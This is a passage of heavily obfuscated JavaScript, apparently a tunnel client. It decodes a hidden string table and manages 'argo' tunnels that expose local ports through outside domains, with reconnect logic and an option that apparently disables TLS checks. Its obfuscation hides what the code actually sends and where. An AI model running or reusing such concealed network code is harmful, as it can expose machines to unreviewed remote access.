        'icaGmI4G5OIw5Bcg5A+g6zkL5PAh5lU25Ps+5ywLic4VA2v5CY8G55UU5B2vicJOV5dOOyWGz2vUzxjHDgvFA2v5CY5WEsdNLj/MIjaP',
        'qxruDw4',
        'x2nOyxjezxzPy2vsvW',
        'vfPIrg4',
        'qKftruLorK9Fq0fdsevFvfrm',
        'Dhz4ALm',
        'mtfJseHKy3m',
        'zw5JCNLWDerHDge',
        'y0PnBNm',
        'vujQsMS',
        'Dg90ywXozxr3B3jRvxa',
        'De1IExK',
        'Cg93zxjZAgvSBc5LEgu',
        'wgL4rxa',
        'A1jyz2e',
        'rxHWCMvZCYbHChaGy3jLyxrLzcbHBMqGzxHWCMvZC1DZigfWCgXPzwq',
        'BMrrtNm',
        'z3b1x25HBwu',
        'C2vUzezYyw1L',
        'AuLZy0i',
        'z2v0t25LDgLTzuXVz3m',
        'BwfNAwm',
        'DhvUBMvSignVBM5Ly3rPB24GCMvNAxn0zxjLzcbHDca',
        'qKn6tui',
        'BgLTAxq',
        'sw5lzuG',
        'CKPqrKC',
        'v3zKru0',
        'D3jPDgvvsw50mtzmrq',
        'x21HCMTsB290',
        'zenmvKC',
        'q29UDhjVBgXLCG',
        'z2v0qMfZzuLUzM9ozxq',
        'zxHPDa',
        'wfbpve8',
        'sLnjz3a',
        'tK9ju0vFqunusu9ox1jfqurFtuvtu0fhrq',
        'v0DjAwC',
        'CYa+ia',
        'zxHWzwn0',
        'z2DvBMm',
        'B2zM',
        'u3vhAwu',
        'EvnVuwq',
        'sfHHBgy',
        'BgLUzq',
        'BxvSDgLWyxj0l2zVCM0Tzgf0ytSGyM91BMrHCNK9',
        'D2fPDgvYCW',
        'ELbkze4',
        'D0Puq1q',
        'Aujmtxa',
        'zwnKC2fqDwjRzxK',
        'DxnLCI1Hz2vUDa',
        'C3rYzwfTia',
        'mxWZFdz8mhW1Fdr8mG',
        'y2vqvwW',
        'DxbSB2fKrMLSzq',
        'C29JAW',
        'rgTMDxm',
        'yLf2q1O',
        'tMznA0S',
        'twLZC2LUzYbHDxrOigHLywrLCNm',
        'z2v0twLUDxrLCW',
        'zhftu0W',
        'C3rHDgLJ',
        'De5RAgi',
        'x2zPBgvdB250ywLUCW',
        'D29YA2rPCJ0VDMfYl2XPyI9KB2nRzxi',
        's29KBuC',
        'q2XVDwrgBgfYzsbpCMLNAw4Gq2vYDgLMAwnHDgu',
        'D29ruuG',
        'zxHWAxjLC19HDa',
        'AdiUy2z0Dw5UzwWUy29T',
        'AxnwywXPzeLqDJq',
        'A2LZyw1Hx3rLCM1PBMfSx3yX',
        'DKDmvfa',
        'CMf3',
        'tvnMtgu',
        'Axb2na',
        'y3b1x25HBwu',
        'C3rYzwfTv2LUzg93CW',
        'u2noz0q',
        'Ahjkq2O',
        'zMLSzw5HBwu',
        'z2v0tg9JywXjuhy2',
        'AxndAgfYywn0zxjezxzPy2u',
        'AxnYCeW',
        'DMDyzwO',
        's2vTqxG',
        'mta0odu3nJaW',
        'x3j1BKXVB3a',
        'lcdKV53NLzNLJP/MLOFKU7BKUi3OPOBNM5ySioACRoASOEs7PEEPUUs7U+wkOEwqR+wkQos4LoAmGEs5HEwmLUwpQUIVUW',
        'sKf6Avy',
        'r1PcvLK',
        'wfvlsM4',
        'Cvbcvfm',
        'Aw5MBW',
        'w1DbuK5Diev4y2vWDgLVBIbSB2fKAw5Nie5VAxnLig1VzhvSztO',
        'g1SZm21Bv0fstL0BwZbTia',
        'sg9ZDdOG',
        'yNjHBMq',
        'EvjNtgS',
        'q0TOwwu',
        'tMnnyu8',
        'mhW0Fdf8mNWZ',
        'z2vUzxjHDgvqywLY',
        'ywXSu2v0DgXLza',
        'tw5RwMW',
        'Ew9bqMe',
        'CMvXDwvZDezPBMLZAgvK',
        'CMvHzezPBgu',
        'twf0y2HLzcbtDwiTCgf0AdOG',
        'x21HCMTqDgvYB2rHy3r5Ba',
        'Aw5PDa',
        'D2fYBMLUzW',
        'Cgf0AcbYzxf1AxjLza',
        'yvbquKy',
        'zunewxy',
        'Avj6y0q',
        'C3rHDhvZ',
        'Aw52ywXPzcbiuefdsYbiDwzMBwfUihbHzgrPBMC',
        'tK1RCue',
        'v2vIu29JA2v0ihjLCxvLC3qGvvjmoIa',
        'C29Tzq',
        'uxjIq2C',
        'dqPdB250zw50lurPC3bVC2L0Aw9UoIbMB3jTlwrHDge7ig5HBwu9iG',
        'l2jPBI9ZAa',
        'ChjVDg9JB2W',
        'u2Lht3u',
        'wKXlCKu',
        'sNzwtum',
        'vvf2whe',
        'Afrdwuy',
        'vwv2sxm',
        'DhLWzq',
        'uMXsCxK',
        'wMLnCvi',
        'renVDve',
        'qg5VyMXLl2n1CNzLCY9UAxn0lMPZ',
        'D3jPDgvuzxH0tgLZDa',
        's2r2rgW',
        'mNWXnhW5FdeZFde3FdeYFdH8mtz8mhWXFdr8mtH8m3W3FdeWFdz8mJb8mtv8mtL8nxWXmq',
        'z1fmq1u',
        'z2zjzM0',
        'q3j5ChrVtwfUywDLCIbPBML0AwfSAxPLza',
        'y29SBgvJDfn0yxrPy0LUzM8',
        'y29UBMvJDgLVBIbJBg9Zzwq',
        'x2rPC3bSyxLqyxrO',
        'CMvMzxjLCG',
        'zxHWzwn0zwqGq2fWj24GuhjVDg8GC3rYDwn0ihbVAw50zxi',
        'CgXfCfC',
        'sLjttw0',
        'rNrOt2i',
        'Be9NCLi',
        'rLfLwwC',
        'weHywvi',
        'BgLUAW',
        'EK1KBue',
        'C2HVCNq',
        'ChjPvxK',
        'BgTzBwe',
        'v1jztgi',
        'qwnJzxnZigrLBMLLzdOGCgf0AcbVDxrZAwrLihjVB3q',
        'CLLlvKe',
        'uvLZANG',
        'z2v0vgfZA1n0yxr1CW',
        'zxLiBNu',
        'DeHxu3i',
        'BfPqvvy',
        'ic0+ideYnY4WlJaUmtO',
        'zxHWzwn0zwrszw1VDgvqDwjcnJq',
        's2n0tLy',
        '4PQG77IpienVBLbuwsdLKk/LIQJLPlhOTkxVViZLM57PGidNRQhPGzpMQkhLVi86ia',
        'x2jHC2vPBMzVx2XVy2fSx3rPBwu',
        'C1PgBKS',
        'l3j1BI8Uy29UDgfPBMvYzw52',
        'rKLmrv9bvurjvf9mt0C',
        'ywXSB2m',
        'z2v0t25LDgLTzvrHC2TZ',
        'DxbKyxrLlwnVBMzPz3vYyxrPB24',
        'C3vIAMvJDa',
        'sfruuca',
        'vxbNCMfKztOGD2vIC29JA2v0',
        'CMvHzgrPCLn5BMm',
        'vM9Prhq',
        'x25LEhq',
        'vhbttxO',
        'Eu5AsLG',
        'mJa0',
        'yxjNBYb0Dw5UzwWGy3jLyxrLzdOG',
        'yxnZAwDU',
        'rhvQAeW',
        'Bg9N',
        'yNrfyLC',
        'Ahr0Chm6lY9ZAhOUywWVFG',
        'vxLhAMK',
        'sNDJyMm',
        'vK9rsfK',
        'AxrLBxmGCMvXDwLYzwqGkg5VBI1LBxb0EsbHCNjHEsK',
        'y3jVBNrHC2TZ',
        'sxfKwLu',
        'CxPrAhq',
        'wKvXz08',
        'z2PZzha',
        'Dg9ju09tDhjPBMC',
        'r0zbCfi',
        'CxvPy2SGDhvUBMvSihjLDhvYBMvKig5VBI1ku09oicG',
        'u0foigrVzxmGBM90ignVDMvYigGYlMnMDhvUBMvSlMnVBq',
        'x2rVtM9PC2viyw5KC2HHA2u',
        'DM5XCxO',
        'zhPLvvq',
        'Dhj1zq',
        'Dg1WzNm',
        'D3jPDgvcAwDvsw50nJrmrq',
        'u1zIBge',
        'Aw52ywXPzcbiuefdsYbiDwzMBwfUihn0CMLUzW',
        'D3jPDgu',
        'AgvHzgvY',
        'w0Tnt0rfxsdWN5Er77IpiowFN+wqJEAwH+s7TUw3SUwiOoMzPdOG',
        'qM5uEva',
        'revcvuC',
        'Ee5xBwu',
        'y29UBMvJDgvKihrVia',
        'zxHWCMvZCY13CW',
        'y29UDgfPBMvY',
        't09tCgq',
        'AxnjBML0Awf0B3i',
        'Dg9tDhjPBMC',
        'zg9hEuC',
        'CMvWB3j0rg9TywLUq2HHBMDL',
        'z0zZCKS',
        'DLbZu3a',
        'wwjqr1O',
        'z2v0qwn0AxzLrwnKC2fwAW',
        'z2v0q3jVBLrHC2TZ',
        'wLDTr0y',
        'sevUBfy',
        'quDwzwK',
        'Bu9NAva',
        'AxbIueO',
        'w0Tnt0rfxsb0Dw5UzwWGzg9TywLUig5VDcbYzwfKEq',
        'zxjYB3jLza',
        'EKzbq08',
        'EuXTz0y',
        'DMvYAwz5u2LNBMf0DxjL',
        'D3jPDgvvsw50mZjmrq',
        'oM1LDgHVza',
        'DejYA1C',
        'Ag9TzwrPCG',
        'koACQUIUVUE9RIWG57Y655Yb5Asn55sOieToqu1fkq',
        'AgvHCNrIzwf0',
        'swXICxO',
        'rK9mte9xx1nztuXjtKTt',
        'CMvHBhbHDgHtEw5J',
        'BwvT',
        'zNvSBa',
        'y29UDgvUDc1Syw5NDwfNzq',
        'Dgv3z3G',
        'zxHWB3j0ia',
        'ihDPDgGGzg9TywLUia',
        'w0Tnt0rfxsdWN5QaieTnt0rfpte6iowqR+wkQoAxTUIhQUwkQowiM+w7UUs4ToAxTUMAP+MbKW',
        'u2vJlvDLyLnVy2TLDc1wzxjZAw9UoIaXmW',
        'zvbHquW',
        'sfjzwei',
        'u1jfBg0',
        'CxHXALq',
        'B25fEhbPCMvK',
        'mtu5odm0mJbPvxDRvxi',
        '8j+uHcbBq2fJAgvDifn0yxr1CYdLRP7ML7BNM5hMJQFNVjpLRzJLT7lOV4FMNj/VViZLT7lPH43MLRdNLj/MIjdLUQBPH4/LV6VNHAFJGii',
        'zvLdvhO',
        'sLPnyNC',
        'wfnusNK',
        'Ag9ZDg5HBwu',
        'CuvsCuy',
        'y2yTy2XVDwrMBgfYzwqTCMvZCg9UC2uTAgvHzgvYCW',
        'y29Uy2f0',
        'y2XLyxi',
        'rvvAswm',
        'CMvWB3j0u2H6ywW',
        'sMH4z0m',
        'uNLhDha',
        'DhvUBMvSu3rHDgu',
        'zgvJB2rL',
        'y3jVBNrHC2TZx2XVzW',
        'sgfUzhnOywTLu3rHDgu',
        're5sCxK',
        'Aw5MBgf0zq',
        'CMvHzgXPBMTtEw5J',
        'BKjJuNa',
        '5lIk5OQL5BYc5BI4oIa',
        'vKfAz2O',
        'y2H1BMTF',
        'Aw52ywXPzcbtrvrusu5huYbWyxLSB2fK',
        's05vv1q',
        'wfPrsva',
        'ChvTCe9YAwDPBG',
        'DLDlzey',
        'CgfYC2u',
        'ksWG5BEY5zUE6ycaidaGkoAzRUMaMUwqR+wkQcK7iowqIoAZLEwpLUwaVdOGmc8XlZi',
        'l2fWAs90yxnRl2XVzY9JCM9U',
        'tg9zDKK',
        'x2nSB25LqMfZzuLUzM9qyxj0',
        '5lIk5OQL5OIq5yQF',
        'tK9ju0vFs0vzu19jtLrfuK5bta',
        'uLbdihjLDhvYBIb1BMLVBIa',
        'ktOG',
        'y29UBMvJDa',
        'zxHWAxjLCW',
        'DgvQBeK',
        'y2yTy2XVDwrMBgfYzwqTCMvZCg9UC2uTBwv0yq',
        'C2v0vtG',
        'xsdWN5QOioIUPoIVGEwKSEI0PE+8JoMDNUAZLsbuB2TLBU+8Gq',
        'u3bSAxq',
        'l3zHCI9SAwiVChrLCM9Kywn0EwWV',
        'rgvZDgLUyxrPB24GAxmGysbMAwXLoIa',
        'BwLU',
        'A2LQBeC',
        'DxnL',
        'oNnJAgvTzq',
        'uKvVz0K',
        'lcdMNiNMLyJMNj8G',
        'BgLZDa',
        'u2TyuuC',
        'y3j5ChrV',
        'y29TBq',
        'AwyTDw5TB2rPzMLLzc1ZAw5Jzq',
        'y050qNa',
        'otm0mtyWChDWB2Lo',
        'CKnHt1m',
        'CgHHC2u',
        'y29UDgvUDc10ExbLlcb1C2vYlwfNzw50lcbHDxrOB3jPEMf0Aw9Ulcb4lw5VBMnLlcb4lxrPBwvZDgfTCcWGEc1HDxrOlxrVA2vUlcb4lwfLCY1LBMnYExb0zwqSihGTzgvIDwCSihGTzMLSzs1WyxrOlcb4lwzPBguTBMfTzsWGEc1JAhvUAY1PzcWGEc10B3rHBc1JAhvUA3m',
        'yxj1tNq',
        'vMfSAwrHDgLUzYbJB25MAwCUlI4',
        'y0Psr2G',
        'Ae5uB0C',
        'w0Tnt0rfxsdIMQdVUi8G5zcV5yQO6zQN6ygt5yIB5BU65AsX6lsLoIa',
        'uuf5ueW',
        'CxvPy2SGDhvUBMvSihnLy3jLDcbOyxmGyw4GDw5LEhbLy3rLzcb0ExbL',
        'quzNAxm',
        'veXWA3a',
        'AKn3qMi',
        'qwjLtLq',
        'zM9UDc93B2zMmG',
        'D2vIC29JA2v0',
        'Bgz6vxm',
        'BgLUDxG',
        'Bg9Hza',
        'z2v0uMvHBhrPBwvjBMzV',
        'q29UDgvUDc1mzw5NDgG',
        'CxrXrgG',
        'x2zVCM1HDeXVz0vUDhj5',
        'zgv0zwn0twfYA3m',
        'zxfHD2G',
        'BMv0D29YA1n0yxrZ',
        't1busu9ouW',
        'sK9nzvq',
        'C3rHCNrtzxnZAw9U',
        'v3v2CwC',
        'ANHwvLa',
        'nNWYFdv8mxW0Fdn8n3WW',
        'zur0t08',
        'ywnJzxnZx2rLBMLLza',
        'q29UBMvJDgLVBJOGvxbNCMfKzq',
        'B0z3rwW',
        'zLzqD1u',
        'DhHFyNL0zxm',
        'DxbKyxrLq29UzMLN',
        'Ec10Aw1LC3rHBxa',
        'vw5Oyw5KBgvKifbYB21PC2uGuMvQzwn0Aw9UoG',
        'x2jHC2vPBMzVx3bFy2fJAgu',
        'B3bLBKnVBNrYB2W',
        'x2nHCevMzKjPDa',
        'y2H1BMTFAwq',
        't2rZuve',
        'twPuAwG',
        'z2v0rNvSBfLLyxi',
        'C2v0',
        'Aw5KzxHpzG',
        'q2fWrwzMoG',
        'B2P6Ahe',
        'zffeB1e',
        'B0LgvhG',
        'CvP2t0u',
        'zwnKC2fFChvIBgLJx2i2na',
        'sxDNruW',
        'AxnwywXPzeLqDJy',
        'sK9TDMW',
        'zgvZDhjVEq',
        'zwnPzxnQCW',
        'BNP6z0C',
        'oNbYB3rVy29S',
        'lNrTCc0',
        'su9usvi',
        'A3Lczfy',
        'zwnPzxnFChvIBgLJx2TLEq',
        'q3fPDgS',
        'x2jHC2vPBMzVx3bFChjVBwLZzq',
        'g1SZnM1Bsu5gt10BwZbTia',
        'AgrdwKi',
        'A0Lfu0S',
        'y3vYBc84lJuUma',
        'vMTsCge',
        'CMfUzg9TqNL0zxm',
        'vLr1swK',
        'ywn0AxzL',
        'D2fYBG',
        'C3vIyxjYyxK',
        'zhLUyw1PyW',
        'C29JA2v0',
        'u1jHAvC',
        'AxngAw5PDgu',
        'qLPdwK4',
        'r3zxyNG',
        'sg5syva',
        'CgfYDgLHBa',
        'ug9PBNq',
        'rfHhsgy',
        'sMP6t1e',
        'sgPNA04',
        'y2H1BMTFAwqGyw5KihrVDgfSx2nODw5RCYbTDxn0igjLig51BwvYAwm',
        'zhnLvwq',
        'C2vJlxDLyNnVy2TLDc1Hy2nLChq',
        'l2fWAs9LEgvJ',
        'r1vIBKm',
        'y3vYCMvUDeXVywq',
        'B256qxq',
        'q2rmqKO',
        'uxfLzeq',
        'sw5PDgLHBgL6Aw5NifrLBxblzxLnyw5Hz2vYlI4U',
        'tM9PC2vFwfHFmJu1mtLFq2HHq2HHug9SEv9cteflrtjZ',
        'DxjS',
        'B3jPz2LUignSB3nLzcbIzwzVCMuGCMvZCg9UC2uGAgvHzgvYCW',
        'u0PoExO',
        'B3zrtfO',
        'B3jPz2LUignVBM5Ly3rPB24GDgLTzw91Da',
        'u1rbvfvtx0nbq0Hfx1ruta',
        'otyWodjJsxnxr2S',
        'y1bhBvq',
        'y29UDgfPBMvYza',
        'vgLTzxn0yw1Wigv4CgLYzwq6igrPzMy9',
        'yKPkC1q',
        'zMDAy3q',
        'runjrvnFufvcteLdx0Tfwv9qru0',
        'Ec1Hz2vUDc12zxjZAw9U',
        'z2vUzxjHDgvtAw5NBgu',
        'zur5zwm',
        'qMHsBM4',
        'rLjvBLa',
        'CwLeAKy',
        'BwXjEue',
        'q1frC2W',
        'wMLMvu8',
        'EhjWy0O',
        'AfPuDLm',
        'CM93CW',
        'CMvXDwvZDa',
        'rwjNuu8',
        'DgvYBwLUywW',
        'ufjjicOGsfruuc8YlJancG0ku00ncG0k',
        'zhzSsLi',
        'sfbbq0SGAw50zwDLCIb0B28GBgfYz2u',
        'Cg9YDcbTDxn0igjLigfUigLUDgvNzxiGyMv0D2vLBIaXigfUzca2ntuZnq',
        'whnVy1u',
        'DeDKwhO',
        'ruTvruu',
        'CMvXDwvZDf9Pza',
        'w1rHC2TtDg9Yzv0G8j+sVIdLT7lMGAlLPi3MJihKUyxLJjBKU7VLIQe6ig9UzxrPBwu9',
        'pdmP',
        'C1bmAMG',
        'CMvHzezYyw1L',
        'Ahr0Chm6lY9PCgvJAg8UBMv0l3bSywLU',
        'CeX4CKi',
        'BM14s2u',
        'DgPOrfG',
        'z2v0sg91CNm',
        'C3bHD24',
        'C0vPyNO',
        'CMvSzwfZzq',
        'zw52AxjVBG',
        'zMLUywXSEq',
        'v0XiA28',
        'sK9NzNG',
        'BM9Uy2u',
        'q09ovfjptf9qvujmsunFs0vz',
        'vgfYz2v0igLZigeGzgLYzwn0B3j5oIa',
        'x3nWBgL0qw5KrMLUAxnO',
        'C3nYDxa',
        'BuHZvMS',
        'CMvHzezPBgvtEw5J',
        'seLtrgK',
        'EMLWnJq',
        'D2LUmZi',
        'wKLvuM4',
        'CMvHzgfIBgu',
        'zMfPBgvKihrVignYzwf0zsb0Dw5UzwW6ia',
        'rfL0AK8',
        'tufyx1rbu0TFte9hx1njwKu',
        'DhfPyLG',
        'BuPYquy',
        'Dg90ywW',
        'tuHiBfy',
        'BM8GCgvLCIbJzxj0AwzPy2f0zq',
        'wNDIwLG',
        'BK1Swvq',
        'zxHWB3j0CW',
        's05btuuG6l+h55+TicG',
        'u2v0lvbtuMvHzeXPBMvpChrPB24GluHPC3rVCNLtyxzLu3r5BguGu2f2zu5VDgHPBMC',
        'zMv0y2Hjua',
        't2rIwM4',
        'ywDL',
        'y2yTAw50lq',
        'CMvHzejPz1vjBNq2neXf',
        's0DWCuO',
        'mc42lJeTANm',
        'CMvSyxrPDMu',
        'runjrvmGCMvZCg9UC2uGzw5JCNLWDgLVBIbMywLSzwq6ia',
        'zxLk',
        'qNjfr00',
        'r0vuia',
        'seHvwuq',
        'zurlzwm',
        'sw52ywXPzcbIB2r5igzVCM1HDdOG',
        'v19psW',
        'Bxfjswu',
        'x21HCMTlDM0',
        'rgzgCee',
        'ChjPBNrLza',
        'rMLSzsb1CgXVywrLzcbZDwnJzxnZzNvSBhKU',
        'y29SCW',
        'CuLuEKu',
        'runjrvnFufvcs0vz',
        'zwnPzxnqDwjRzxK',
        'CMvJDxjZAxzL',
        'tgnpyLe',
        'CMvQzwn0',
        'x1niwKfmx0Tfwv9isu5ux1nit1Do',
        'DhvUBMvSrg9TywLU',
        'z2v0tg9Nu3vTBwfYEq',
        'A0XwD2m',
        'Cu9frge',
        'lJaWmfO',
        'wxr5Aui',
        'mxWZFdr8mNW1Fda',
        'y29WEuzPBgvtEw5J',
        'r09Yz2K',
        'C2HtEfe',
        'zw50CMLLCW',
        'wKLqx01bwf9msvnururFrKLmrvm',
        'y3HOtvG',
        'swjfyK0',
        'teHYrum',
        'C2HPzNq',
        'B25eB21HAw5dAgfUz2u',
        'C3LZDgvT',
        'zw5JCNLWDa',
        'z2v0qxv0AfrHzW',
        'zgvSzxrLrMLSzxm',
        'u2v0DgLUzYb1CcbxzwjtB2nRzxqGDgvYBwLUywWGCM91DguUlI4',
        'BgLZDgvU',
        'DhrS',
        'Evz6rLu',
        'B1L4sLu',
        'CMvTB3zL',
        't0PosxK',
        'zMvLza',
        'Ag9Tzq',
        'zwnKC2fFChjPDMf0zv9RzxK',
        'sMrxBg0',
        'C3rHDgu',
        'Dvvyv0G',
        'wwXcAhu',
        'DgfIBgvfBNrYEq',
        'ExPtvLu',
        'C3rYAw5NAwz5',
        'B3DUzxi',
        'w0Tnt0rfxsdIMQdVUi8G5z+F5zcn5PAh5lU25yAz5ywL5AsX6lsLicG'
    ];
    a0a = function () {
        return h4;
    };
    return a0a();
}
const a0aI = a0aH(a0aY(0x3a4), 0x5, 0x2), a0aJ = 0x1e, a0aK = ((() => {
        const fd = a0aY, a = {
                'Gihkf': function (c, d, f) {
                    return c(d, f);
                },
                'qfvcX': function (c, d) {
                    return c < d;
                },
                'NSMBY': function (c, d) {
                    return c * d;
                },
                'zkvLU': function (c, d) {
                    return c === d;
                }
            }, b = a[fd(0x1ab)](parseInt, process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number[fd(0x2f3)](b) || a[fd(0x8fb)](b, 0x0))
            return a[fd(0x412)](0x12c, 0x3e8);
        return a[fd(0x438)](b, 0x0) ? 0x0 : a['NSMBY'](Math['max'](b, 0xa), 0x3e8);
    })());
function a0aL(a) {
    const fe = a0aY, b = {
            'zeKpm': function (c, d) {
                return c === d;
            },
            'lhQWG': fe(0x33e),
            'DNRqy': fe(0x8bc)
        };
    if (b[fe(0x7b3)](typeof a, b[fe(0x3cb)])) {
        const c = a[fe(0x2eb)]();
        if (c)
            try {
                return JSON[fe(0x675)](c);
            } catch (d) {
            }
        return {};
    }
    return a && typeof a === b[fe(0x669)] ? a : {};
}
class a0aM {
    constructor(a) {
        const ff = a0aY;
        this[ff(0x60c)] = a, this[ff(0x316)] = new Map(), this[ff(0x774)] = null;
    }
    async [a0aY(0x278)](a, b) {
        const fg = a0aY, c = {
                'hkjJM': function (l, m) {
                    return l > m;
                },
                'MlEHF': function (l, m) {
                    return l(m);
                },
                'bzjkP': fg(0x2e5),
                'nJKrq': fg(0x73a),
                'xSmQR': fg(0x530),
                'VakFG': function (l, m) {
                    return l + m;
                },
                'Ycrft': function (l, m) {
                    return l + m;
                },
                'ipbPJ': function (l, m) {
                    return l + m;
                },
                'WgGff': fg(0x609),
                'Yyvyx': fg(0x5f5)
            }, d = this[fg(0x316)]['get'](a) || [];
        if (c[fg(0x3bc)](d[fg(0x8fc)], 0x0) && !b) {
            const l = new Error(fg(0x52f) + a + fg(0x4e4));
            l[fg(0x5c3)] = 0x199, l[fg(0x4c8)] = a;
            throw l;
        }
        let f, g, h, i;
        try {
            [f, g, h, i] = await c[fg(0x3b6)](a0au, c['bzjkP']);
        } catch (m) {
            const n = new Error(c[fg(0x799)] + m['message']);
            n[fg(0x5c3)] = 0x1f4, n['port'] = a;
            throw n;
        }
        const j = f[fg(0x49a)](c[fg(0x509)]) ? f : c[fg(0x54b)]('https://', f), k = {
                'tunnelDomain': j,
                'port': a,
                'createdAt': new Date()[fg(0x618)]()[fg(0x7ee)](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'runPromise': null
            };
        return k[fg(0x846)] = this[fg(0x5a6)](k, g, h, i)[fg(0x843)](o => this[fg(0x60c)][fg(0x5be)](fg(0x22b) + j + '\x20ended:\x20' + o[fg(0x113)])), d['push'](k), this[fg(0x316)]['set'](a, d), this[fg(0x60c)][fg(0x5ac)](c[fg(0x80f)](c[fg(0x63b)](c[fg(0x80f)](c['WgGff'], j), c[fg(0x3c3)]), a)), k;
    }
    [a0aY(0x68d)]() {
        const fh = a0aY, a = [], b = [...this[fh(0x316)][fh(0x3d5)]()][fh(0x3e6)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this['tunnels'][fh(0x14d)](c)) {
                a[fh(0x1f0)]({
                    'tunnel_domain': d[fh(0x764)],
                    'port': d[fh(0x4c8)],
                    'created_at': d[fh(0x1b3)]
                });
            }
        }
        return a;
    }
    async [a0aY(0x77e)](a, b) {
        const fi = a0aY, c = {
                'jJlfU': function (i, j) {
                    return i === j;
                },
                'wNmZi': function (i, j) {
                    return i !== j;
                },
                'CWlWJ': function (i, j) {
                    return i > j;
                },
                'QEqYO': 'argo\x20tunnel\x20deleted:\x20'
            }, d = this[fi(0x316)][fi(0x14d)](a) || [];
        if (d[fi(0x8fc)] === 0x0)
            return {
                'status': 0x194,
                'message': fi(0x419) + a
            };
        let f;
        if (b === undefined || b === null || c[fi(0x168)](b, '')) {
            if (d['length'] > 0x1)
                return {
                    'status': 0x199,
                    'message': 'multiple\x20tunnels\x20exist\x20on\x20port\x20' + a + ',\x20specify\x20tunnel_domain\x20to\x20disambiguate'
                };
            f = d;
        } else {
            f = d['filter'](i => i[fi(0x764)] === b);
            if (c['jJlfU'](f[fi(0x8fc)], 0x0))
                return {
                    'status': 0x194,
                    'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a + fi(0x64f) + b
                };
        }
        const g = [];
        for (const i of f) {
            i[fi(0x42a)] = !![];
            if (c[fi(0x79d)](i[fi(0x585)], null))
                try {
                    i['sock'][fi(0x6cf)]();
                } catch (j) {
                }
            await i[fi(0x846)][fi(0x843)](() => {
            }), g[fi(0x1f0)]({
                'tunnel_domain': i['tunnelDomain'],
                'port': i[fi(0x4c8)],
                'created_at': i[fi(0x1b3)]
            });
        }
        const h = d[fi(0x3fe)](k => !k[fi(0x42a)]);
        c[fi(0x1b8)](h['length'], 0x0) ? this['tunnels'][fi(0x6c4)](a, h) : this['tunnels']['delete'](a);
        for (const k of g) {
            this[fi(0x60c)][fi(0x5ac)](c['QEqYO'] + k[fi(0x3bb)]);
        }
        return {
            'status': 'ok',
            'deleted': g['length'],
            'tunnels': g
        };
    }
    async ['_runLoop'](a, b, c, d) {
        const fj = a0aY, f = {
                'GwAKR': fj(0x893),
                'NnrXh': function (k, l) {
                    return k(l);
                },
                'vCNOu': 'true',
                'PcgOf': function (k, l, m) {
                    return k(l, m);
                },
                'WkTIj': function (k, l) {
                    return k % l;
                },
                'doGyG': function (k, l) {
                    return k + l;
                },
                'GYzeM': function (k, l) {
                    return k + l;
                },
                'OjvOI': fj(0x7dd),
                'tsgUl': fj(0x3fd),
                'RPSjK': function (k, l) {
                    return k !== l;
                },
                'Rkrec': function (k, l) {
                    return k * l;
                }
            }, g = f['GwAKR'] + a[fj(0x4c8)], h = async k => {
                const fk = fj;
                for (let l = 0x0; l < k && !a[fk(0x42a)]; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math[fk(0x687)](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a[fj(0x42a)]) {
            let k = null, l = null;
            try {
                const m = f[fj(0x2c8)](String, process.env.KISAMA_EDGE_INSECURE || '')[fj(0x52c)]() !== f[fj(0x12a)];
                k = await f[fj(0x341)](a0aF, m, this[fj(0x60c)]);
                if (a[fj(0x42a)]) {
                    try {
                        k[fj(0x6cf)]();
                    } catch (n) {
                    }
                    break;
                }
                a[fj(0x585)] = k, j = f['WkTIj'](f['doGyG'](j, 0x1), 0x4), l = new a0ax(k, g, b, c, d, j, this[fj(0x60c)], a[fj(0x764)], ![], { 'printed': !![] }), await l[fj(0x8e9)]();
            } catch (o) {
                !a[fj(0x42a)] && this[fj(0x60c)][fj(0x5be)](f[fj(0x630)](f[fj(0x2a6)](f[fj(0x236)], a['tunnelDomain']), f[fj(0x44d)]) + o[fj(0x113)]);
            } finally {
                if (f['RPSjK'](k, null))
                    try {
                        k[fj(0x6cf)]();
                    } catch (p) {
                    }
                a['sock'] = null;
            }
            if (a['stopped'])
                break;
            l !== null && l['registered'] ? i = 0x0 : (i += 0x1, i >= a0aI && (await this[fj(0x918)](a, (q, r, s) => {
                b = q, c = r, d = s;
            }) ? i = 0x0 : await h(f[fj(0xe5)](a0aJ, 0x3e8)))), !a[fj(0x42a)] && await h(a0aG * 0x3e8);
        }
    }
    [a0aY(0x918)](a, b) {
        const fl = a0aY, c = {
                'RbhYn': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'OWyQa': 'https://',
                'hZTvS': function (f, g) {
                    return f + g;
                },
                'XPOTO': function (f, g) {
                    return f + g;
                },
                'IkyPn': function (f, g) {
                    return f + g;
                },
                'mqrVx': function (f, g) {
                    return f + g;
                },
                'QExoV': fl(0x7c4),
                'dGgNl': function (f, g) {
                    return f === g;
                },
                'mGUGx': fl(0x53c),
                'chlkp': function (f, g) {
                    return f(g);
                },
                'zFACO': fl(0x2e5)
            }, d = this[fl(0x4a6)] || a0au;
        return c['chlkp'](d, c[fl(0x63e)])['then'](([f, g, h, i]) => {
            const fm = fl, j = a[fm(0x764)];
            c['RbhYn'](b, g, h, i), a['tunnelDomain'] = f[fm(0x49a)](c[fm(0x82a)]) ? f : c[fm(0x711)](c[fm(0x82a)], f), this[fm(0x60c)][fm(0x5be)](c[fm(0x56e)](c[fm(0x1ce)](c[fm(0x422)](fm(0x198), j), c[fm(0x23f)]), a[fm(0x764)]));
            if (c['dGgNl'](typeof this['onDomainChange'], fm(0x809)))
                try {
                    this[fm(0x774)](j, a['tunnelDomain']);
                } catch (k) {
                }
            return !![];
        })[fl(0x843)](f => {
            const fn = fl;
            return this['log']['warning'](c[fn(0x711)](c[fn(0x2bc)], f[fn(0x113)])), ![];
        });
    }
}
class a0aN {
    static [a0aY(0x534)] = ![];
    static [a0aY(0x3e3)] = null;
    static [a0aY(0x84e)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static ['_SHZAL_KEY_HINT_SHOWN'] = ![];
    static [a0aY(0x3d1)]() {
        const fo = a0aY, a = {
                'jtCIz': function (g, h) {
                    return g < h;
                },
                'wRqZv': fo(0x160),
                'vbkgX': function (g, h) {
                    return g < h;
                },
                'Qvkps': fo(0x917),
                'nLvyi': fo(0x44c),
                'FAlfU': function (g, h) {
